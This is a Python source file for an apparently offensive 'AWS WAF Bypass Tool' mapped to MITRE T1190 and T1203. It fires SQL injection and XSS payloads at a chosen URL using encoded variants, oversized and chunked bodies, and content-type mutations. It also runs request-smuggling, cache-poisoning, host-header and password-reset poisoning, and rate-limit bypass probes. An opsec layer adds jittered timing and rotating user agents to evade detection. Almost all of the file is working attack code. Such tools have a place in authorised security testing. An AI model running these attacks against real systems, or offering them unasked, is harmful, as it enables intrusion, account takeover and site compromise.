#!/usr/bin/env python3
"""
AWS WAF Bypass Tool

MITRE ATT&CK Mapping:
  T1190 - Exploit Public-Facing Application
  T1203 - Exploitation for Client Execution

Tests encoding variants, size limit evasion, rule group bypass, and
Content-Type mutation against AWS WAF-protected targets.
"""

import argparse
import json
import os
import random
import signal
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

_PIPELINE = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'pipeline'))
if _PIPELINE not in sys.path:
    sys.path.insert(0, _PIPELINE)
try:
    from modules import opsec
except ImportError:
    import opsec

init(autoreset=True)
SHOULD_EXIT = False

BANNER = f"""{Fore.CYAN}
    _        __        __    _  __        __
   / \\      / \\ \\      / /  | | \\ \\      / /
  / _ \\    / _ \\ \\ /\\ / /   | |  \\ \\ /\\ / /
 / ___ \\  / ___ \\ V  V /    | |   \\ V  V /
/_/   \\_\\/_/   \\_\\_/\\_/     |_|    \\_/\\_/
{Fore.RESET}"""


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

PAYLOADS = [
    ("UTF-8 SQLi", "' OR '1'='1"), ("Double URL SQLi", "%2527%2520OR%2520%25271%2527%25253D%25271"),
    ("Mixed SQLi", "'%20OR%20%271%27%3D%271"), ("Comment SQLi", "'/**/OR/**/'1'='1"),
    ("Case SQLi", "UnIoN SeLeCt 1,2,3,4"), ("Standard XSS", "<script>alert(1)</script>"),
    ("Double URL XSS", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
    ("Polyglot XSS", "\"'><img src=x onerror=alert(1)>"),
    ("UTF-7 XSS", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"),
    ("Null XSS", "<script>alert(1)%00</script>"),
]

OPSEC_PROFILE = None


def _profile():
    return OPSEC_PROFILE if OPSEC_PROFILE is not None else opsec.DEFAULT


def _session():
    global _OPSEC_SESSION
    try:
        return _OPSEC_SESSION
    except NameError:
        _OPSEC_SESSION = opsec.http_session(_profile())
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass
        return _OPSEC_SESSION


def _send(method, url, timeout_sec, headers=None, data=None, params=None, cookies=None):
    """Throttled request through the opsec session. Returns (response, error)."""
    try:
        resp = opsec.throttled(_session(), url, method=method, profile=_profile(),
                               headers=headers, data=data, params=params,
                               cookies=cookies or {}, timeout=timeout_sec)
    except requests.Timeout:
        return None, "timeout"
    except requests.RequestException:
        return None, "request_failed"
    if resp is None or getattr(resp, "status_code", 0) == 0:
        return None, "request_failed"
    return resp, None


def do_get(url, timeout_sec, extra_headers=None, params=None):
    resp, _err = _send("GET", url, timeout_sec, headers=extra_headers, params=params)
    return resp


def _canary_host():
    return f"pwn-{random.randint(1000000, 9999999)}.example"


def _canary_token():
    return f"pwn{random.randint(10000000, 99999999)}"


def _reflected(resp, token):
    if resp is None or not token:
        return False
    if token in (resp.text or ""):
        return True
    try:
        return any(token in str(v) for v in (resp.headers or {}).values())
    except Exception:
        return False


def check_target(url):
    resp = do_get(url, 10)
    return resp is not None and resp.status_code < 500


def technique_encoding_variants(url, param, timeout_sec):
    results = []
    baseline, berr = _send("GET", url, timeout_sec)
    if baseline is None:
        return [{"technique": "encoding_variants", "label": "baseline_failed", "bypassed": False,
                 "error": berr or "request_failed"}]
    bl_len = len(baseline.text)
    for label, payload in PAYLOADS:
        if SHOULD_EXIT:
            break
        resp, err = _send("GET", url, timeout_sec, params={param: payload})
        if resp is None:
            results.append({"technique": "encoding_variants", "label": label, "bypassed": False,
                            "error": err or "request_failed"})
            continue
        blocked = resp.status_code in (403, 429) or "requestblocked" in resp.text.lower()
        body = resp.text.lower()
        reflected = payload.lower()[:20] in body if len(payload) > 5 else False
        sql_err = any(kw in body for kw in ["sql", "mysql", "syntax", "unclosed", "quotation"])
        bypassed = not blocked and resp.status_code == 200 and (reflected or sql_err or abs(len(body) - bl_len) > 30)
        results.append({"technique": "encoding_variants", "label": label, "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_size_evasion(url, param, timeout_sec):
    results = []
    long_payload = "A" * 9000 + "' OR '1'='1"
    resp, err = _send("GET", url, timeout_sec, params={param: long_payload})
    if resp is None:
        results.append({"technique": "size_evasion", "variant": "oversized", "bypassed": False,
                        "error": err or "request_failed"})
    else:
        results.append({"technique": "size_evasion", "variant": "oversized", "status": resp.status_code, "bypassed": resp.status_code == 200})
    for cs, label in [(100, "chunk_100"), (500, "chunk_500")]:
        if SHOULD_EXIT:
            break
        resp, err = _send("POST", url, timeout_sec,
                          data={param: "B" * cs + "<script>alert(1)</script>"},
                          headers={"Transfer-Encoding": "chunked",
                                   "Content-Type": "application/x-www-form-urlencoded"})
        if resp is None:
            results.append({"technique": "size_evasion", "variant": label, "bypassed": False,
                            "error": err or "request_failed"})
        else:
            results.append({"technique": "size_evasion", "variant": label, "status": resp.status_code, "bypassed": resp.status_code in (200, 201)})
    return results


def technique_rule_bypass(url, param, timeout_sec):
    tests = [
        ("Comment", "1'/*!*/OR/*!*/'1'='1"), ("Parameter Pollution", f"{param}=1&{param}=2"),
        ("Case Folding", "1' oR '1'='1"), ("Tab Inj", "1'\tOR\t'1'='1"),
        ("Newline", "1'\nOR\n'1'='1"),
    ]
    results = []
    for label, payload in tests:
        if SHOULD_EXIT:
            break
        resp, err = _send("GET", url, timeout_sec, params={param: payload})
        if resp is None:
            results.append({"technique": "rule_bypass", "label": label, "bypassed": False,
                            "error": err or "request_failed"})
            continue
        blocked = resp.status_code in (403, 429) or "requestblocked" in resp.text.lower()
        results.append({"technique": "rule_bypass", "label": label, "status": resp.status_code, "bypassed": not blocked and resp.status_code == 200})
    return results


def technique_content_type(url, param, timeout_sec):
    results = []
    payload = "' OR '1'='1"
    tests = [
        ("application/json", json.dumps({param: payload})),
        ("application/xml", f"<root><{param}>{payload}</{param}></root>"),
        ("text/plain", {param: payload}),
    ]
    for ct, data in tests:
        if SHOULD_EXIT:
            break
        resp, err = _send("POST", url, timeout_sec, data=data, headers={"Content-Type": ct})
        if resp is None:
            results.append({"technique": "content_type", "label": ct, "bypassed": False,
                            "error": err or "request_failed"})
            continue
        results.append({"technique": "content_type", "label": ct, "status": resp.status_code, "bypassed": resp.status_code in (200, 201)})
    return results


def technique_header_smuggling(url, param, timeout_sec):
    """CL.TE / TE.TE desync and hop-header probes (attack-request-smuggling).

    Targets ALB/CloudFront fronting where front and back may disagree on
    request boundaries; flags responses diverging from the GET baseline."""
    results = []
    if not _profile().allows_aggressive:
        return [{"technique": "header_smuggling", "label": "skipped_quiet_profile", "bypassed": False}]
    baseline, _err = _send("GET", url, timeout_sec)
    if baseline is None:
        return [{"technique": "header_smuggling", "label": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    vectors = [
        ("te_chunked_empty", {"Transfer-Encoding": "chunked"}, None),
        ("cl_te_conflict", {"Content-Length": "0", "Transfer-Encoding": "chunked"}, None),
        ("te_te_xchunked", {"Transfer-Encoding": "xchunked"}, None),
        ("te_space_suffix", {"Transfer-Encoding ": "chunked"}, None),
        ("te_duplicate_trailing", {"Transfer-Encoding": "chunked", "Transfer-Encoding ": "identity"}, None),
        ("cl_duplicate_trailing", {"Content-Length": "0", "Content-Length ": "12"}, "x"),
        ("cl_partial_chunk_body", {"Transfer-Encoding": "chunked"}, "1\r\nA\r\nX"),
        ("te_cl_prefixed_body", {"Content-Length": "0", "Transfer-Encoding": "chunked"}, "8\r\npwnprobe\r\n0\r\n\r\n"),
        ("xff_desync_hint", {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"}, None),
    ]
    for label, headers, body in vectors:
        if SHOULD_EXIT:
            break
        try:
            resp = opsec.throttled(_session(), url, method="POST", profile=_profile(),
                                   headers=headers, data=body, timeout=timeout_sec)
        except requests.Timeout:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "timeout_desync_hint"})
            continue
        except requests.RequestException:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        if resp is None or getattr(resp, "status_code", 0) == 0:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        diff = abs(len(resp.text) - bl_len)
        bypassed = resp.status_code == 200 and (diff > 50 or resp.status_code != baseline.status_code)
        results.append({"technique": "header_smuggling", "label": label, "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_cache_poisoning(url, param, timeout_sec):
    """Unkeyed-header cache poisoning probes (attack-cache-poison).

    Fingerprints CloudFront cache behavior, hunts unkeyed headers and the
    target parameter with benign canaries, payload only when profile allows."""
    results = []
    baseline, _err = _send("GET", url, timeout_sec)
    if baseline is None:
        return [{"technique": "cache_poisoning", "label": "baseline_failed", "bypassed": False}]
    cache_headers = ["x-cache", "x-amz-cf-id", "x-amz-cf-pop", "age", "via", "cache-control"]
    found = [f"{k}={baseline.headers.get(k)}" for k in cache_headers if baseline.headers.get(k)]
    results.append({"technique": "cache_poisoning",
                    "label": "cache_fingerprint:" + (",".join(found) if found else "none"),
                    "status": baseline.status_code, "bypassed": False})
    host = _canary_host()
    token = _canary_token()
    probes = [
        ("x_forwarded_host", {"X-Forwarded-Host": host}, host),
        ("x_forwarded_scheme", {"X-Forwarded-Scheme": "nothttps"}, None),
        ("x_forwarded_port", {"X-Forwarded-Port": "1337"}, None),
        ("x_original_url", {"X-Original-URL": "/" + token}, token),
        ("x_rewrite_url", {"X-Rewrite-URL": "/" + token}, token),
        ("x_http_method_override", {"X-HTTP-Method-Override": "GET"}, None),
    ]
    had_location = bool(baseline.headers.get("Location"))
    for label, headers, marker in probes:
        if SHOULD_EXIT:
            break
        resp, err = _send("GET", url, timeout_sec, headers=headers)
        if resp is None:
            results.append({"technique": "cache_poisoning", "label": label, "bypassed": False,
                            "error": err or "request_failed"})
            continue
        reflected = _reflected(resp, marker)
        redirected = (not had_location) and bool(resp.headers.get("Location"))
        results.append({"technique": "cache_poisoning", "label": label, "status": resp.status_code,
                        "bypassed": reflected or redirected})
    ptoken = _canary_token()
    resp, err = _send("GET", url, timeout_sec, params={param: ptoken})
    if resp is None:
        results.append({"technique": "cache_poisoning", "label": f"unkeyed_param_{param}", "bypassed": False,
                        "error": err or "request_failed"})
    else:
        results.append({"technique": "cache_poisoning", "label": f"unkeyed_param_{param}", "status": resp.status_code,
                        "bypassed": ptoken in (resp.text or "")})
    if _profile().allows_aggressive:
        payload = host + '"><script>alert(1)</script>'
        resp, err = _send("GET", url, timeout_sec, headers={"X-Forwarded-Host": payload})
        if resp is None:
            results.append({"technique": "cache_poisoning", "label": "payload_xfh_script", "bypassed": False,
                            "error": err or "request_failed"})
        else:
            results.append({"technique": "cache_poisoning", "label": "payload_xfh_script", "status": resp.status_code,
                            "bypassed": "alert(1)" in (resp.text or "")})
            if "alert(1)" in (resp.text or ""):
                clean, _err2 = _send("GET", url, timeout_sec)
                results.append({"technique": "cache_poisoning", "label": "cached_reflection_confirmed",
                                "status": clean.status_code if clean else 0,
                                "bypassed": clean is not None and "alert(1)" in (clean.text or "")})
    else:
        results.append({"technique": "cache_poisoning", "label": "payload_skipped_quiet", "bypassed": False})
    return results


def technique_host_header(url, param, timeout_sec):
    """Host header variation probes (attack-host-header).

    Duplicate-Host via trailing-space name, port/userinfo injection and
    forwarded-host substitutes; bypass = injected marker reflected back."""
    results = []
    baseline, _err = _send("GET", url, timeout_sec)
    if baseline is None:
        return [{"technique": "host_header", "label": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    parsed = urllib.parse.urlparse(url)
    original = parsed.netloc
    host = _canary_host()
    vectors = [
        ("host_override", {"Host": host}, host),
        ("host_port_injection", {"Host": f"{original}:1337"}, "1337"),
        ("host_userinfo_injection", {"Host": f"{original}@{host}"}, host),
        ("host_trailing_space", {"Host ": host}, host),
        ("x_forwarded_host", {"X-Forwarded-Host": host}, host),
        ("x_host", {"X-Host": host}, host),
        ("x_forwarded_server", {"X-Forwarded-Server": host}, host),
        ("x_http_host_override", {"X-HTTP-Host-Override": host}, host),
        ("forwarded_header", {"Forwarded": f"host={host}"}, host),
        ("x_original_url_admin", {"X-Original-URL": "/admin"}, "/admin"),
    ]
    for label, headers, marker in vectors:
        if SHOULD_EXIT:
            break
        resp, err = _send("GET", url, timeout_sec, headers=headers)
        if resp is None:
            results.append({"technique": "host_header", "label": label, "bypassed": False,
                            "error": err or "request_failed"})
            continue
        diff = abs(len(resp.text) - bl_len)
        reflected = _reflected(resp, marker)
        bypassed = resp.status_code == 200 and (reflected or diff > 50 or resp.status_code != baseline.status_code)
        results.append({"technique": "host_header", "label": label, "status": resp.status_code, "bypassed": bypassed})
    if any(p in (parsed.path or "").lower() for p in ("forgot", "reset", "password")):
        if _profile().allows_aggressive:
            resp, err = _send("POST", url, timeout_sec, headers={"X-Forwarded-Host": host},
                              data={"email": "pwncanary@example.com"})
            if resp is None:
                results.append({"technique": "host_header", "label": "reset_poison", "bypassed": False,
                                "error": err or "request_failed"})
            else:
                results.append({"technique": "host_header", "label": "reset_poison", "status": resp.status_code,
                                "bypassed": host in (resp.text or "")})
        else:
            results.append({"technique": "host_header", "label": "reset_poison_skipped_quiet", "bypassed": False})
    return results


def technique_rate_endpoint_variation(url, param, timeout_sec):
    """Endpoint/method rate-limit bypass (attack-rate-limit-bypass).

    Engages the limiter with baseline requests, then varies path casing,
    separators, cache-busting query params (including the target param)
    and HTTP methods."""
    results = []
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    query = parsed.query
    base = f"{parsed.scheme}://{parsed.netloc}{path}" + (f"?{query}" if query else "")
    for _ in range(3):
        if SHOULD_EXIT:
            break
        _send("GET", base, timeout_sec)
    segments = [s for s in path.split("/") if s]
    upper_path = "/" + "/".join(s.upper() for s in segments) if segments else "/"
    title_path = "/" + "/".join(s[:1].upper() + s[1:] for s in segments) if segments else "/"
    clean_path = path.rstrip("/") or "/"

    def variant_url(new_path):
        return f"{parsed.scheme}://{parsed.netloc}{new_path}" + (f"?{query}" if query else "")

    variants = [
        ("path_case_upper", variant_url(upper_path)),
        ("path_case_title", variant_url(title_path)),
        ("trailing_slash", variant_url(clean_path + "/")),
        ("trailing_dot", variant_url(clean_path + "/.")),
        ("double_slash", variant_url(path.replace("/", "//"))),
        ("semicolon_js", variant_url(clean_path + ";.js")),
        ("query_bust_epoch", base + (("&_=" if query else "?_=") + str(int(time.time())))),
        ("query_bust_rand", base + (("&cb=" if query else "?cb=") + _canary_token())),
        ("query_bust_param", base + (("&" if query else "?") + f"{param}=x")),
        ("method_head", None),
        ("method_post_empty", None),
    ]
    for label, vurl in variants:
        if SHOULD_EXIT:
            break
        if label == "method_head":
            headers = {"User-Agent": opsec.next_ua(_profile())}
            opsec.sleep_jitter(_profile())
            sess = _session()
            try:
                resp = sess.request("HEAD", base, headers=headers, timeout=timeout_sec)
            except AttributeError:
                resp = sess.get(base, headers=headers, timeout=timeout_sec)
            except requests.RequestException:
                resp = None
        elif label == "method_post_empty":
            resp, _err = _send("POST", base, timeout_sec)
        else:
            resp, _err = _send("GET", vurl, timeout_sec)
        if resp is None or getattr(resp, "status_code", 0) == 0:
            results.append({"technique": "rate_endpoint_variation", "label": label, "bypassed": False, "error": "request_failed"})
        else:
            results.append({"technique": "rate_endpoint_variation", "label": label, "status": resp.status_code,
                            "bypassed": resp.status_code == 200})
    return results


def run_techniques(url, param, timeout_sec, threads):
    print(f"\n{Fore.CYAN}[*] Target: {url} | param={param}{Style.RESET_ALL}")
    if not check_target(url):
        print(f"{Fore.RED}[X] Target unreachable.{Style.RESET_ALL}")
        return []
    all_results = []
    techniques = [
        ("Encoding Variants", technique_encoding_variants),
        ("Size Evasion", technique_size_evasion),
        ("Rule Bypass", technique_rule_bypass),
        ("Content-Type", technique_content_type),
        ("Header Smuggling", technique_header_smuggling),
        ("Cache Poisoning", technique_cache_poisoning),
        ("Host Header", technique_host_header),
        ("Rate Endpoint Variation", technique_rate_endpoint_variation),
    ]
    workers = threads if _profile().allows_aggressive else 1
    with ThreadPoolExecutor(max_workers=workers) as ex:
        fmap = {ex.submit(fn, url, param, timeout_sec): name for name, fn in techniques}
        for f in as_completed(fmap):
            name = fmap[f]
            try:
                res = f.result()
                all_results.extend(res)
                b = sum(1 for r in res if r.get("bypassed"))
                print(f"{Fore.GREEN}[+] {name}: {b}/{len(res)} bypassed{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[X] {name} failed: {e}{Style.RESET_ALL}")
    return all_results


def print_report(results):
    if not results:
        return
    bypassed = [r for r in results if r.get("bypassed")]
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  AWS WAF BYPASS | total={len(results)} bypassed={len(bypassed)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for r in bypassed:
        d = r.get("label") or r.get("variant", "?")
        print(f"  {Fore.GREEN}[BYPASS] {r['technique']} | {d}{Style.RESET_ALL}")
    for r in [r for r in results if not r.get("bypassed")][:10]:
        d = r.get("label") or r.get("variant", "?")
        print(f"  {Fore.YELLOW}[BLOCKED] {r['technique']} | {d}{Style.RESET_ALL}")


def main():
    global OPSEC_PROFILE
    parser = argparse.ArgumentParser(description="AWS WAF Bypass — MITRE T1190, T1203")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="id", help="Target parameter name")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=4, help="Max threads")
    parser.add_argument("-o", "--output", help="Save JSON output")
    noise = parser.add_mutually_exclusive_group()
    noise.add_argument("--quiet", dest="profile", action="store_const", const="quiet",
                       help="QUIET: 2.0s+-1.0s delay, fixed UA, no aggressive checks")
    noise.add_argument("--moderate", dest="profile", action="store_const", const="moderate",
                       help="MODERATE: 0.5s+-0.25s delay, rotating UA (default)")
    noise.add_argument("--loud", dest="profile", action="store_const", const="loud",
                       help="LOUD: no artificial delay, full parallelism")
    parser.set_defaults(profile="moderate")
    args = parser.parse_args()
    OPSEC_PROFILE = opsec.Profile(args.profile)
    opsec.apply(OPSEC_PROFILE)
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    results = run_techniques(args.url, args.param, args.timeout, args.threads)
    print_report(results)
    if args.output and results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] {sum(1 for r in results if r.get('bypassed'))} bypasses found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
